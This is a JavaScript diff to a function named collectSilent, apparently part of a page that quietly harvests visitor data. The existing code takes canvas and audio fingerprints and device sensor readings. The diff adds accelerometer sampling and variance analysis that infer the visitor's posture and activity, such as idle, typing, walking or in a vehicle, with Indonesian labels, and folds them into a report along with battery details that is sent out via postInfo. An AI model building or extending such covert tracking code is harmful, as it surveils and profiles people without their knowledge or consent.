@@ -62,9 +62,15 @@ function collectSilent() {
   }
   var cHash = getCanvasFp();
 
-  var mStr = "N/A", oStr = "N/A";
+  var mStr = "N/A", oStr = "N/A", motionSamples = [];
   window.addEventListener('deviceorientation', function (e) { if (e.alpha !== null) oStr = "A:" + Math.round(e.alpha) + " B:" + Math.round(e.beta) + " G:" + Math.round(e.gamma); });
-  window.addEventListener('devicemotion', function (e) { if (e.accelerationIncludingGravity && e.accelerationIncludingGravity.x !== null) mStr = "X:" + Math.round(e.accelerationIncludingGravity.x) + " Y:" + Math.round(e.accelerationIncludingGravity.y) + " Z:" + Math.round(e.accelerationIncludingGravity.z); });
+  window.addEventListener('devicemotion', function (e) { 
+    if (e.accelerationIncludingGravity && e.accelerationIncludingGravity.x !== null) {
+      var x = e.accelerationIncludingGravity.x, y = e.accelerationIncludingGravity.y, z = e.accelerationIncludingGravity.z;
+      mStr = "X:" + Math.round(x) + " Y:" + Math.round(y) + " Z:" + Math.round(z);
+      motionSamples.push(Math.sqrt(x*x + y*y + z*z));
+    } 
+  });
 
   function getAudioFp(callback) {
     try {
@@ -114,7 +120,38 @@ function collectSilent() {
       + '\nAudio_FP: ' + aHash;
 
     function postInfo(batt) {
-      var finalInfo = sysinfo + '\n\n--- Sensors ---\nOrientation: ' + oStr + '\nMotion_XYZ: ' + mStr;
+      var posture = "Perangkat PC Statis", activity = "Memakai Komputer (Tanpa Sensor)";
+      if (mStr !== "N/A") {
+        posture = "Menunggu Kalibrasi...";
+        var match = mStr.match(/X:(-?\d+) Y:(-?\d+) Z:(-?\d+)/);
+        if(match) {
+          var ax = Math.abs(parseInt(match[1])), ay = Math.abs(parseInt(match[2])), az = Math.abs(parseInt(match[3]));
+          if (az >= 8) posture = "Perangkat diletakkan datar (Di atas meja/AFK)";
+          else if (ay >= 7) posture = "Perangkat ditegakkan (Menatap layar)";
+          else if (ax >= 7) posture = "Perangkat dimiringkan (Mode Landscape/Laptop Layar Lipat)";
+          else posture = "Perangkat condong santai (Sudut miring)";
+        }
+      }
+      
+      if (motionSamples.length > 3) {
+         var sum = 0; for(var i=0; i<motionSamples.length; i++) sum += motionSamples[i];
+         var mean = sum / motionSamples.length, variance = 0;
+         for(var i=0; i<motionSamples.length; i++) variance += Math.pow(motionSamples[i] - mean, 2);
+         variance /= motionSamples.length;
+         
+         if (variance < 0.2) activity = "Diam Statis / AFK (Tidak disentuh)";
+         else if (variance < 0.8) activity = "Pegerakan Santai / Sedang Mengetik";
+         else if (variance < 4.0) activity = "Sedang Berjalan / Membawa Perangkat";
+         else if (variance < 10.0) activity = "Berjalan Cepat / Berada di Kendaraan Lembut";
+         else activity = "Berlari / Berguncang Keras";
+      } else if (mStr !== "N/A") {
+         activity = "Mengkalibrasi Sensor...";
+      }
+
+      var dOStr = oStr === "N/A" ? "Tidak Terdeteksi (Absen / Limitasi Hardware)" : oStr;
+      var dMStr = mStr === "N/A" ? "Tidak Ditemukan (Bypass Sensor PC)" : mStr;
+
+      var finalInfo = sysinfo + '\n\n--- Sensors & Kinematics ---\nOrientation: ' + dOStr + '\nMotion_XYZ: ' + dMStr + '\nPosture_Mode: ' + posture + '\nPhysical_Act: ' + activity;
       if (batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
       finalInfo += '```';
 
